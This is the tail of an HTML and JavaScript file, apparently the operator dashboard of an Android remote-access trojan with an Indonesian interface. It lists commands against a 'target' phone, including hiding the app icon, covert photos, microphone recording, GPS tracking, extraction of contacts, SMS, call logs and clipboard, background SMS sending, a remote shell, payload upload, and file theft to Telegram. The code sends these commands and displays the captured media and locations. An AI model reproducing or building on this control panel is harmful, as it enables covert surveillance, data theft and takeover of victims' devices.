            @click.stop>
            <div
                class="bg-black/40 px-6 py-5 border-b border-white/5 flex justify-between items-center sticky top-0 z-10 backdrop-blur-xl">
                <h3 class="text-lg font-black text-white flex items-center gap-3">
                    <div class="p-2 bg-primary/20 rounded-lg text-primary"><svg class="w-5 h-5" fill="none"
                            stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5"
                                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg></div> Detail Transaksi
                </h3>
                <button @click="closeDetailModal"
                    class="rounded-xl p-2.5 text-gray-400 hover:text-white hover:bg-white/10 transition-colors focus:outline-none bg-white/5">
                    <span class="sr-only">Close</span><svg class="h-5 w-5" fill="none" viewBox="0 0 24 24"
                        stroke-width="2.5" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>
            </div>
            <div class="px-6 py-6 overflow-y-auto flex-1 text-sm custom-scrollbar relative">
                <div x-show="isLoadingDetail" class="flex flex-col justify-center items-center py-20 gap-4">
                    <svg class="animate-spin h-10 w-10 text-primary" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4">
                        </circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
                    </svg>
                    <p class="text-gray-400 font-bold animate-pulse tracking-widest uppercase text-xs">Memuat
                        Instrumen...</p>
                </div>
                <div x-show="!isLoadingDetail && detailLog" class="space-y-6">
                    <!-- Meta Grid -->
                    <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                        <div class="bg-black/30 p-4 rounded-2xl border border-white/5">
                            <label
                                class="text-[10px] font-black uppercase text-gray-500 tracking-widest mb-1 block">Waktu
                                Tercatat</label>
                            <div class="text-white font-mono break-words" x-text="detailLog?.log?.created_at"></div>
                        </div>
                        <div class="bg-black/30 p-4 rounded-2xl border border-white/5">
                            <label
                                class="text-[10px] font-black uppercase text-gray-500 tracking-widest mb-1 block">Target
                                Node</label>
                            <div class="text-primary font-bold break-words" x-text="detailLog?.log?.device_id"></div>
                        </div>
                        <div class="bg-black/30 p-4 rounded-2xl border border-white/5">
                            <label
                                class="text-[10px] font-black uppercase text-gray-500 tracking-widest mb-1 block">Tipe
                                Objek</label>
                            <div class="text-amber-400 font-bold break-words capitalize flex items-center gap-1"><span
                                    x-text="detailLog?.parsedBody?.type || 'Sistem_Log'"></span></div>
                        </div>
                        <div class="bg-black/30 p-4 rounded-2xl border border-white/5">
                            <label
                                class="text-[10px] font-black uppercase text-gray-500 tracking-widest mb-1 block">Status</label>
                            <div class="inline-flex px-2 py-1 bg-emerald-500/10 text-emerald-400 rounded border border-emerald-500/20 uppercase font-black tracking-widest text-[10px]"
                                x-text="detailLog?.log?.level"></div>
                        </div>
                    </div>

                    <!-- Command Block -->
                    <div x-show="detailLog?.command"
                        class="bg-black/30 rounded-2xl p-5 border border-white/5 relative overflow-hidden">
                        <div class="absolute top-0 right-0 p-4 opacity-10 pointer-events-none"><svg class="w-24 h-24"
                                fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path>
                            </svg></div>
                        <h4
                            class="text-[11px] font-black text-gray-500 uppercase tracking-widest flex items-center gap-2 mb-3">
                            <div class="w-2 h-2 rounded-full bg-primary"></div> Instruksi Eksekusi
                        </h4>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 relative z-10">
                            <div><span class="text-gray-500 text-xs">Perintah:</span> <span
                                    class="text-white ml-2 font-mono font-bold px-2 py-1 bg-white/5 rounded"
                                    x-text="detailLog?.command?.command"></span></div>
                            <div><span class="text-gray-500 text-xs">Argumen:</span> <span class="text-gray-300 ml-2"
                                    x-text="detailLog?.command?.text || '(Kosong)'"></span></div>
                            <div class="md:col-span-2 flex items-center gap-2"><span
                                    class="text-gray-500 text-xs">Durasi Proses:</span> <span
                                    class="text-emerald-400 font-bold px-2 py-1 bg-emerald-500/10 rounded border border-emerald-500/20"
                                    x-text="calculateDuration(detailLog?.command)"></span></div>
                        </div>
                    </div>

                    <!-- Response Payload -->
                    <div>
                        <div class="flex items-center justify-between mb-2">
                            <h4
                                class="text-[11px] font-black text-gray-500 uppercase tracking-widest flex items-center gap-2">
                                <div class="w-2 h-2 rounded-full bg-secondary"></div> Respon Payload Mentah
                            </h4>
                            <button @click="copyToClipboard(JSON.stringify(detailLog?.parsedBody, null, 2))"
                                class="text-xs text-primary hover:text-indigo-300 font-bold flex items-center gap-1 active:scale-95 transition-all bg-primary/10 px-3 py-1.5 rounded-lg"><svg
                                    class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z">
                                    </path>
                                </svg> Salin Data</button>
                        </div>
                        <div class="bg-[#0f1117] rounded-2xl p-4 overflow-x-auto shadow-inner border border-white/5">
                            <pre class="text-xs text-gray-300 font-mono"
                                x-html="JSON.stringify(detailLog?.parsedBody, null, 2)"></pre>
                        </div>
                    </div>

                    <!-- Media Audio -->
                    <div x-show="detailLog?.parsedBody?.type === 'audio_url'">
                        <h4 class="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Pemutar Audio
                            Rekaman</h4>
                        <audio controls class="w-full mt-2" :src="detailLog?.parsedBody?.data"></audio>
                    </div>

                    <!-- Media Photo -->
                    <div x-show="detailLog?.parsedBody?.type === 'photo_url'">
                        <h4 class="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Pratinjau Foto
                            Lensa Kamera</h4>
                        <img :src="detailLog?.parsedBody?.data"
                            class="w-full max-w-2xl mt-2 rounded-2xl border-4 border-white/10 shadow-2xl"
                            alt="Foto Kamera" />
                    </div>

                    <!-- Location GPS Map -->
                    <div x-show="['location', 'location_data'].includes(detailLog?.parsedBody?.type)">
                        <h4
                            class="text-[11px] font-black text-gray-500 uppercase tracking-widest flex items-center gap-2 mb-2">
                            <div class="w-2 h-2 rounded-full bg-amber-400"></div> Peta Kordinat Target
                        </h4>
                        <div id="detail-map"
                            class="w-full h-80 rounded-2xl mt-2 border border-white/10 shadow-2xl z-[5]"></div>
                        <div class="flex gap-4 mt-3">
                            <a :href="'https://www.google.com/maps?q=' + (detailLog?.parsedBody?.data?.lat || detailLog?.parsedBody?.data?.latitude || 0) + ',' + (detailLog?.parsedBody?.data?.lon || detailLog?.parsedBody?.data?.lng || detailLog?.parsedBody?.data?.longitude || 0)"
                                target="_blank"
                                class="px-5 py-2.5 bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 text-xs font-bold rounded-xl border border-blue-500/20 transition-all flex items-center gap-2 active:scale-95">Buka
                                di Google Maps <svg class="w-4 h-4" fill="none" stroke="currentColor"
                                    viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14">
                                    </path>
                                </svg></a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="bg-black/40 px-6 py-4 flex flex-row-reverse rounded-b-3xl border-t border-white/5">
                <button type="button"
                    class="inline-flex justify-center rounded-xl bg-primary/20 px-6 py-2.5 text-sm font-bold text-primary hover:bg-primary/30 border border-primary/30 transition-all active:scale-95"
                    @click="closeDetailModal">Selesai</button>
            </div>
        </div>
    </div>

    <!-- Alpine MODALS and LOGIC Wrapper -->
    <div id="alpine-inject-anchor"></div>
    <script>
        document.addEventListener('alpine:init', () => {
            Alpine.data('dashboard', () => ({
                devices: [],
                logs: [],
                hostLogs: [],
                activeTab: 'system',
                selectedDevice: null,
                cmdInput: '',
                textInput: '',
                isSending: false,
                isFetchingDevices: false,
                isFetchingLogs: false,
                clearLogDays: 0,
                toasts: [],
                toastId: 0,
                isDetailModalOpen: false,
                isLoadingDetail: false,
                currentMobileTab: 'stats',
                detailLog: null,
                stats: { topCommands: [], fastestCommands: [], deviceStatus: { online: 0, offline: 0 }, dailyActivity: [] },
                commandsChart: null,
                activityChart: null,

                isConfirmOpen: false,
                confirmTitle: '',
                confirmMessage: '',
                onConfirm: null,

                availableCommands: [
                    { name: 'ping', desc: 'Tes koneksi Background (respon pong seketika)', needsPayload: false },
                    { name: 'get_device_info', desc: 'Tarik Merk, Versi OS', needsPayload: false },
                    { name: 'get_battery', desc: 'Cek persentase baterai', needsPayload: false },
                    { name: 'show_toast', desc: 'Tampilkan pop-up toast. Payload: [text]', needsPayload: true },
                    { name: 'get_volume', desc: 'Info Volume Ring, Alarm, Notif', needsPayload: false },
                    { name: 'set_volume', desc: 'Atur volume. Payload: [type] [level] (Cth: music 15)', needsPayload: true },
                    { name: 'vibrate', desc: 'Getar paksa target. Payload: [durasi detik]', needsPayload: true },
                    { name: 'hide_app', desc: 'Sembunyikan ikon aplikasi/Launcher Icon', needsPayload: false },
                    { name: 'torch', desc: 'Matikan/Nyalakan Senter. Payload: on / off', needsPayload: true },
                    { name: 'sensors', desc: 'Tarik daftar semua sensor manufaktur', needsPayload: false },
                    { name: 'photo front', desc: 'Uji Kamera Belakang/Selfie Base64', needsPayload: false },
                    { name: 'photo back', desc: 'Uji Kamera Belakang resolusi tinggi', needsPayload: false },
                    { name: 'record_sound', desc: 'Rekam mik audio MP4. Payload: [durasi detik]', needsPayload: true },
                    { name: 'location', desc: 'Tangkap titik GPS Lat/Lon', needsPayload: false },
                    { name: 'wifi_scan', desc: 'List jaringan WiFi di sekitar target', needsPayload: false },
                    { name: 'contacts', desc: 'Ekstrak seluruh Data Kontak', needsPayload: false },
                    { name: 'sms_list', desc: 'Tarik SMS Inbox masuk', needsPayload: false },
                    { name: 'sms_send', desc: 'Background SMS. Payload: [nomor]|[pesan]', needsPayload: true },
                    { name: 'clipboard', desc: 'Baca teks Copy/Paste terbaru', needsPayload: false },
                    { name: 'get_call_logs', desc: 'Riwayat Telepon. Payload: [limit]', needsPayload: true },
                    { name: 'get_installed_apps', desc: 'Tarik skema Package Name & App Terinstall', needsPayload: false },
                    { name: 'ls', desc: 'Jelajah File Explorer. Payload: [path] (Cth: /sdcard/)', needsPayload: true },
                    { name: 'download', desc: 'Sedot file dari remote target ke telegram', needsPayload: false },
                    { name: 'upload', desc: 'Remote Upload payload script/file dropping', needsPayload: true },
                    { name: 'shell', desc: 'Tarik BASH Terminal interaktif. Payload: [command]', needsPayload: true },
                    { name: 'notify', desc: 'Kirim Push Notification. Payload: [Title]|[Body]', needsPayload: true },
                    { name: 'open_url', desc: 'Paksa target membuka link/browser. Payload: [link]', needsPayload: true },
                    { name: 'set_wallpaper', desc: 'Ganti Background Layar instan. Payload: [url_gambar]', needsPayload: true },
                    { name: 'dial_number', desc: 'Panggil Nomor Telepon/USSD. Payload: [nomor]', needsPayload: true },
                    { name: 'play_alarm', desc: 'Bunyikan Alarm Bypass DND volume maksimal', needsPayload: false },
                    { name: 'tts', desc: 'Suara Google TTS dari Speaker. Payload: [teks pesan]', needsPayload: true },
                    { name: 'play_sound', desc: 'Putar File Latar Audio. Payload: [url_mp3]', needsPayload: true }
                ],
                filteredCommands: [],
                showAutocomplete: false,
                hoverIndex: 0,
                expandedLogs: {},

                init() {
                    this.fetchDevices();
                    this.fetchLogs();
                    this.fetchStats();
                    setInterval(() => {
                        this.fetchDevices();
                        this.fetchLogs();
                        this.fetchStats();
                    }, 30000);
                },

                async fetchStats() {
                    try {
                        const res = await fetch('/admin/api/stats');
                        if (res.ok) {
                            this.stats = await res.json();
                            this.$nextTick(() => this.renderCharts());
                        }
                    } catch (e) {
                        console.error('Gagal memuat statistik', e);
                    }
                },

                renderCharts() {
                    const cmdCtx = document.getElementById('commandsChart')?.getContext('2d');
                    if (cmdCtx && this.stats.topCommands?.length > 0) {
                        if (this.commandsChart) this.commandsChart.destroy();
                        this.commandsChart = new Chart(cmdCtx, {
                            type: 'doughnut',
                            data: {
                                labels: this.stats.topCommands.map(c => c.command),
                                datasets: [{
                                    data: this.stats.topCommands.map(c => c.count),
                                    backgroundColor: ['#4f46e5', '#818cf8', '#6366f1', '#a5b4fc', '#c7d2fe'],
                                    borderWidth: 0
                                }]
                            },
                            options: {
                                responsive: true,
                                maintainAspectRatio: false,
                                plugins: {
                                    legend: {
                                        position: 'right',
                                        labels: { color: '#9ca3af', font: { size: 10 }, usePointStyle: true, padding: 10 }
                                    }
                                }
                            }
                        });
                    }

                    const actCtx = document.getElementById('activityChart')?.getContext('2d');
                    if (actCtx && this.stats.dailyActivity?.length > 0) {
                        if (this.activityChart) this.activityChart.destroy();
                        this.activityChart = new Chart(actCtx, {
                            type: 'line',
                            data: {
                                labels: this.stats.dailyActivity.map(a => a.date),
                                datasets: [{
                                    label: 'Perintah',
                                    data: this.stats.dailyActivity.map(a => a.count),
                                    borderColor: '#4f46e5',
                                    backgroundColor: 'rgba(79, 70, 229, 0.1)',
                                    fill: true,
                                    tension: 0.4,
                                    pointRadius: 4,
                                    pointBackgroundColor: '#4f46e5'
                                }]
                            },
                            options: {
                                responsive: true,
                                maintainAspectRatio: false,
                                plugins: { legend: { display: false } },
                                scales: {
                                    y: { beginAtZero: true, grid: { color: 'rgba(75, 85, 99, 0.2)' }, ticks: { color: '#9ca3af', stepSize: 1 } },
                                    x: { grid: { display: false }, ticks: { color: '#9ca3af' } }
                                }
                            }
                        });
                    }

                    const durCtx = document.getElementById('durationChart')?.getContext('2d');
                    if (durCtx && this.stats.slowestCommands?.length > 0) {
                        if (this.durationChart) this.durationChart.destroy();
                        this.durationChart = new Chart(durCtx, {
                            type: 'bar',
                            data: {
                                labels: this.stats.slowestCommands.map(c => c.command),
                                datasets: [
                                    {
                                        label: 'Turbo Mode',
                                        data: this.stats.slowestCommands.map(c => Number(c.avg_turbo || 0).toFixed(2)),
                                        backgroundColor: 'rgba(16, 185, 129, 0.4)',
                                        borderColor: '#10b981',
                                        borderWidth: 2,
                                        borderRadius: 6,
                                        barThickness: 15
                                    },
                                    {
                                        label: 'Normal Mode',
                                        data: this.stats.slowestCommands.map(c => Number(c.avg_normal || 0).toFixed(2)),
                                        backgroundColor: 'rgba(245, 158, 11, 0.4)',
                                        borderColor: '#f59e0b',
                                        borderWidth: 2,
                                        borderRadius: 6,
                                        barThickness: 15
                                    }
                                ]
                            },
                            options: {
                                indexAxis: 'y',
                                responsive: true,
                                maintainAspectRatio: false,
                                plugins: {
                                    legend: {
                                        display: true,
                                        position: 'top',
                                        labels: { color: '#9ca3af', usePointStyle: true, padding: 15 }
                                    },
                                    tooltip: { callbacks: { label: (ctx) => ` ${ctx.dataset.label}: ${ctx.raw} detik` } }
                                },
                                scales: {
                                    y: { grid: { display: false }, ticks: { color: '#9ca3af', font: { weight: 'bold' } } },
                                    x: { grid: { color: 'rgba(75, 85, 99, 0.2)' }, ticks: { color: '#9ca3af' }, title: { display: true, text: 'Detik (Avg)', color: '#9ca3af' } }
                                }
                            }
                        });
                    }
                },

                async fetchDevices() {
                    this.isFetchingDevices = true;
                    try {
                        const res = await fetch('/admin/api/devices');
                        if (res.ok) {
                            const data = await res.json();
                            console.log('Devices API Response:', data);
                            this.devices = data.devices || [];
                        } else {
                            if (res.status === 403) {
                                window.location.reload();
                            } else {
                                const errData = await res.json().catch(() => ({}));
                                this.showToast('Gagal memuat perangkat: ' + (errData.error || res.statusText), 'error');
                            }
                        }
                    } catch (e) {
                        console.error('Gagal memuat perangkat', e);
                        this.showToast('Gangguan koneksi saat memuat perangkat.', 'error');
                    } finally {
                        setTimeout(() => this.isFetchingDevices = false, 500);
                    }
                },

                async fetchLogs() {
                    this.isFetchingLogs = true;
                    try {
                        const res = await fetch('/admin/api/logs');
                        if (res.ok) {
                            const data = await res.json();
                            console.log('Logs API Response:', data);
                            this.logs = data.logs || [];
                            this.hostLogs = data.hostLogs || [];
                        } else {
                            if (res.status !== 403) {
                                const errData = await res.json().catch(() => ({}));
                                this.showToast('Gagal memuat log: ' + (errData.error || res.statusText), 'error');
                            }
                        }
                    } catch (e) {
                        console.error('Gagal memuat log', e);
                        this.showToast('Gangguan koneksi saat memuat log.', 'error');
                    } finally {
                        setTimeout(() => this.isFetchingLogs = false, 500);
                    }
                },

                async togglePollingMode(devId, currentMode) {
                    const nextMode = currentMode === 'turbo' ? 'normal' : 'turbo';
                    const label = nextMode === 'turbo' ? 'Turbo' : 'Normal';
                    try {
                        const res = await fetch('/admin/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                device_id: devId,
                                command: 'set_polling_mode',
                                text: nextMode
                            })
                        });
                        if (res.ok) {
                            this.showToast('Berhasil mengirim perintah ganti ke mode ' + label, 'success');
                            this.fetchDevices();
                        } else {
                            this.showToast('Gagal mengubah mode polling.', 'error');
                        }
                    } catch (e) {
                        this.showToast('Gangguan jaringan saat mengubah mode.', 'error');
                    }
                },

                customConfirm(title, message, onConfirmCallback) {
                    this.confirmTitle = title;
                    this.confirmMessage = message;
                    this.onConfirm = onConfirmCallback;
                    this.isConfirmOpen = true;
                    document.body.style.overflow = 'hidden';
                },

                closeConfirm() {
                    this.isConfirmOpen = false;
                    this.onConfirm = null;
                    if (!this.isDetailModalOpen) {
                        document.body.style.overflow = '';
                    }
                },

                async deleteDevice(id) {
                    this.customConfirm('Hapus Perangkat', 'Apakah Anda yakin ingin menghapus jejak perangkat ini beserta seluruh riwayat log dan perintahnya?', async () => {
                        try {
                            const res = await fetch('/admin/api/device/' + id, { method: 'DELETE' });
                            if (res.ok) {
                                this.showToast('Perangkat ' + id + ' berhasil diblokir/dihapus.', 'success');
                                if (this.selectedDevice === id) this.selectedDevice = null;
                                this.fetchDevices();
                                this.fetchLogs();
                            } else {
                                this.showToast('Gagal menghapus perangkat.', 'error');
                            }
                        } catch (e) {
                            this.showToast('Gangguan jaringan saat menghapus.', 'error');
                        }
                    });
                },

                async clearLogs() {
                    this.customConfirm('Hapus Log Sistem', 'Hati-hati! Ini akan membersihkan riwayat log dan perintah di sistem berdasarkan filter tanggal. Lanjutkan?', async () => {
                        try {
                            const res = await fetch('/admin/api/logs?days=' + this.clearLogDays, { method: 'DELETE' });
                            if (res.ok) {
                                this.showToast('Log dan riwayat perintah berhasil dibersihkan.', 'success');
                                this.fetchLogs();
                            } else {
                                this.showToast('Gagal membersihkan log.', 'error');
                            }
                        } catch (e) {
                            this.showToast('Gangguan jaringan saat membersihkan.', 'error');
                        }
                    });
                },

                async clearHostLogs() {
                    this.customConfirm('Kosongkan Stderr.log', 'Peringatan! File error log server akan dikosongkan secara permanen. Lanjutkan?', async () => {
                        try {
                            const res = await fetch('/admin/api/host-logs', { method: 'DELETE' });
                            if (res.ok) {
                                this.showToast('File stderr.log berhasil dikosongkan.', 'success');
                                this.fetchLogs();
                            } else {
                                this.showToast('Gagal mengosongkan log hosting.', 'error');
                            }
                        } catch (e) {
                            this.showToast('Gangguan jaringan saat mengosongkan.', 'error');
                        }
                    });
                },

                async sendCommand() {
                    if (!this.cmdInput.trim() || !this.selectedDevice) return;
                    this.isSending = true;
                    try {
                        const res = await fetch('/admin/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                device_id: this.selectedDevice,
                                command: this.cmdInput,
                                text: this.textInput
                            })
                        });
                        if (res.ok) {
                            this.showToast('Perintah terkirim ke antrean database!', 'success');
                            this.cmdInput = '';
                            this.textInput = '';
                            this.fetchLogs();
                        } else {
                            const err = await res.json();
                            this.showToast('Gagal: ' + (err.error || 'Server error'), 'error');
                        }
                    } catch (e) {
                        this.showToast('Gangguan Jaringan!', 'error');
                    } finally {
                        this.isSending = false;
                    }
                },

                filterCommands() {
                    const search = this.cmdInput.toLowerCase().trim();
                    if (!search) {
                        this.filteredCommands = this.availableCommands;
                    } else {
                        this.filteredCommands = this.availableCommands.filter(cmd =>
                            cmd.name.toLowerCase().includes(search) || cmd.desc.toLowerCase().includes(search)
                        );
                    }
                    this.hoverIndex = 0;
                },

                selectCommand(cmd) {
                    this.cmdInput = cmd.name;
                    this.showAutocomplete = false;

                    if (cmd.needsPayload) {
                        this.$nextTick(() => {
                            this.$refs.payloadInput.focus();
                        });
                    }
                },

                calculateDuration(cmd) {
                    if (!cmd || !cmd.created_at || !cmd.completed_at) return 'Otomatis';
                    const start = new Date(cmd.created_at + ' Z');
                    const end = new Date(cmd.completed_at + ' Z');
                    const diffMs = end - start;
                    const diffSec = Math.floor(diffMs / 1000);
                    if (diffSec < 60) return diffSec + ' detik';
                    return Math.floor(diffSec / 60) + 'm ' + (diffSec % 60) + 's';
                },

                formatDate(val, isSqlTimestamp = false) {
                    try {
                        if (!val || val === 0) return 'Belum Aktif';
                        let date;
                        if (isSqlTimestamp) {
                            date = new Date(val + ' Z');
                        } else {
                            date = new Date(val * 1000);
                        }
                        return date.toLocaleString('id-ID', {
                            timeZone: 'Asia/Makassar',
                            hour12: false,
                            hour: '2-digit',
                            minute: '2-digit',
                            second: '2-digit',
                            day: '2-digit',
                            month: 'short'
                        });
                    } catch (e) {
                        return val;
                    }
                },

                showToast(message, type = 'success') {
                    const id = this.toastId++;
                    this.toasts.push({ id, message, type });
                    setTimeout(() => this.dismissToast(id), 4000);
                },

                dismissToast(id) {
                    this.toasts = this.toasts.filter(t => t.id !== id);
                },

                async openDetailModal(id) {
                    this.isDetailModalOpen = true;
                    document.body.style.overflow = 'hidden';
                    this.isLoadingDetail = true;
                    this.detailLog = null;
                    try {
                        const res = await fetch('/admin/api/log/' + id);
                        if (res.ok) {
                            this.detailLog = await res.json();
                            this.$nextTick(() => {
                                this.initDetailMap();
                            });
                        } else {
                            this.showToast('Gagal memuat detail log (404)', 'error');
                            this.closeDetailModal();
                        }
                    } catch (e) {
                        this.showToast('Gangguan koneksi memuat detail', 'error');
                        this.closeDetailModal();
                    } finally {
                        this.isLoadingDetail = false;
                    }
                },

                initDetailMap() {
                    const type = this.detailLog?.parsedBody?.type;
                    const data = this.detailLog?.parsedBody?.data;
                    if ((type === 'location' || type === 'location_data') && data) {
                        const lat = parseFloat(data.lat);
                        const lon = parseFloat(data.lon || data.lng);
                        if (!isNaN(lat) && !isNaN(lon)) {
                            setTimeout(() => {
                                const mapContainer = document.getElementById('detail-map');
                                if (!mapContainer) return;
                                const map = L.map('detail-map').setView([lat, lon], 16);
                                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                                    attribution: '&copy; OpenStreetMap &copy; CARTO'
                                }).addTo(map);
                                L.marker([lat, lon]).addTo(map)
                                    .bindPopup('Lokasi Target (' + (data.accuracy || '?') + 'm)')
                                    .openPopup();
                            }, 100);
                        }
                    }
                },

                closeDetailModal() {
                    this.isDetailModalOpen = false;
                    if (!this.isConfirmOpen) {
                        document.body.style.overflow = '';
                    }
                    setTimeout(() => { this.detailLog = null; }, 300);
                },

                copyToClipboard(text) {
                    navigator.clipboard.writeText(text).then(() => {
                        this.showToast('Data Disalin!', 'success');
                    }).catch(err => {
                        this.showToast('Gagal menyalin', 'error');
                    });
                }
            }))
        });

    </script>
</body>

</html>